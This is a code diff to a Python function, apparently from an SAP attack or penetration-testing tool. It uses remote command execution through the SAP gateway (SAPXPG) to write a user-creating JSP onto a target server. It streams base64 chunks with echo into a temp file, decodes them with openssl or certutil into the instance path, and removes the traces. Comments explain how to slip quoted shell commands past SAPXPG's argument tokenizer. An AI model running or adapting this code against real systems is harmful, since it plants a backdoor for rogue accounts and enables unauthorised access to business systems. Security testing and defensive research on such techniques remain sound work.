@@ -417,21 +417,28 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
     suffix = "".join(_r.choice(_s.ascii_lowercase) for _ in range(6))
 
     if linux:
-        shell = "/bin/sh"
+        # On Linux some SAPXPG kernels do a raw whitespace split on
+        # PARAMS (dropping both " and \" as literal chars), which
+        # breaks any `/bin/sh -c "..."` script with embedded spaces.
+        # For the decode step we sidestep the shell entirely by using
+        # /usr/bin/openssl, which accepts -in and -out as separate
+        # argv tokens.  For the echo chunks we still need a shell,
+        # but we wrap the script in SINGLE quotes — single quotes
+        # survive every sapxpg tokenizer we've seen in the wild, and
+        # base64 content is pure [A-Za-z0-9+/=] so it can't contain one.
+        chunk_shell = "/bin/sh"
+        decode_shell = "/usr/bin/openssl"
         tmp_b64 = f"/tmp/sapmap_ume_{suffix}.b64"
         chunk_size = 800  # POSIX shells have much more cmdline room
 
-        # SAPXPG PARAMS tokenizer doesn't decode \" escapes — inner quotes
-        # leak through raw and bash errors with an unclosed quote.  The
-        # /usr/sap/<SID>/J<nn>/... target path never contains whitespace,
-        # so we can drop the inner quoting entirely.
         def echo_args(chunk, op):
-            return f'-c "echo {chunk} {op} {tmp_b64}"'
+            return f"-c 'echo {chunk} {op} {tmp_b64}'"
 
-        decode_args = f'-c "base64 -d {tmp_b64} > {target_path}"'
-        cleanup_args = f'-c "rm -f {tmp_b64}"'
+        decode_args = f"enc -d -base64 -in {tmp_b64} -out {target_path}"
+        cleanup_args = f"-c 'rm -f {tmp_b64}'"
     else:
-        shell = "cmd.exe"
+        chunk_shell = "cmd.exe"
+        decode_shell = "cmd.exe"
         tmp_b64 = r"%TEMP%\sapmap_ume.b64"
 
         def echo_args(chunk, op):
@@ -447,14 +454,14 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
 
     # 0) Clean up any prior leftover
     try:
-        exec_fn(shell, cleanup_args)
+        exec_fn(chunk_shell, cleanup_args)
     except Exception:
         pass
 
     # 1) Stream base64 chunks
     for idx, chunk in enumerate(chunks):
         op = ">" if idx == 0 else ">>"
-        r = exec_fn(shell, echo_args(chunk, op))
+        r = exec_fn(chunk_shell, echo_args(chunk, op))
         if not r.get("success"):
             return {"success": False,
                     "error": f"chunk {idx+1}/{len(chunks)} write failed: "
@@ -463,7 +470,8 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
     # 2) Decode to target JSP.  On Windows the /C wrapper is important
     #    so %TEMP% in the source path expands (SAPXPG does not resolve
     #    environment variables when invoking certutil directly).
-    r = exec_fn(shell, decode_args)
+    #    On Linux we use openssl with argv-only I/O (no shell).
+    r = exec_fn(decode_shell, decode_args)
     if not r.get("success"):
         return {"success": False,
                 "error": f"decode step failed: {r.get('error', '?')}"}
@@ -472,14 +480,15 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
     out_text = " ".join(r.get("output") or [])
     low = out_text.lower()
     for marker in ("failed", "error", "no such file",
-                     "can't exec external program", "exit code 1"):
+                     "can't exec external program", "exit code 1",
+                     "unable to load"):
         if marker in low:
             return {"success": False,
                     "error": f"decode reported error: {out_text[:200]}"}
 
     # 3) Clean up the tmp base64 file
     try:
-        exec_fn(shell, cleanup_args)
+        exec_fn(chunk_shell, cleanup_args)
     except Exception:
         pass
 
